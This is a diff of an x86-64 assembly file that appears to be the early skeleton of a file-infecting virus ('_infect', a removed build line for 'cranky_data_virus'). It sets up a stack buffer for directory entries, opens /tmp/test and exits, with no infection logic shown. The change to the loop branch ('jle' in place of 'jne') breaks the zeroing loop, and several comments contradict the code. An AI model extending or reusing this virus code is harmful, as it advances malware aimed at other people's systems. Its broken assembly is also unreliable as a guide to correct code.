@@ -1,8 +1,8 @@
 %define FOLDER_1 "/tmp/test"
 %define FOLDER_2 "/tmp/test2"
 
-%define FILE_SIZE 8
-%define BUFFER_SIZE 1024
+%define FILE_SIZE 4
+%define LINUX_DIRENT 128
 
 %define SYS_OPEN 2
 %define SYS_EXIT 60
@@ -16,15 +16,18 @@ section .text
 
 _infect:
     ; maybe push ALL USEFULL REGISTERS to restore state before leaving infection
-    mov rcx, FILE_SIZE + BUFFER_SIZE
+    mov rcx, FILE_SIZE + LINUX_DIRENT
+    ;[rsp] filename
+    ;[rsp + 32] linux_dirent
 
 loop_bss:
-    mov rax, 0x00
-    push rax                            ; 4 bytes on stack
+    xor rax, rax
+    push rax                                ; 8 bytes on stack
     dec rcx
     cmp rcx, 0
-    jne loop_bss
+    jle loop_bss
     ; RSP contains fake BSS
+    mov rbp, rsp ; Maybe
     call open_dir
     db FOLDER_1, 0
 
@@ -40,10 +43,3 @@ quit:
     mov rax, SYS_EXIT
     mov rdi, 0
     syscall
-
-
-
-
-
-;; nasm -f elf -F dwarf -g cranky_data_virus.asm
-;; ld -m elf_i386 -e v_start -o cranky_data_virus cranky_data_virus.o
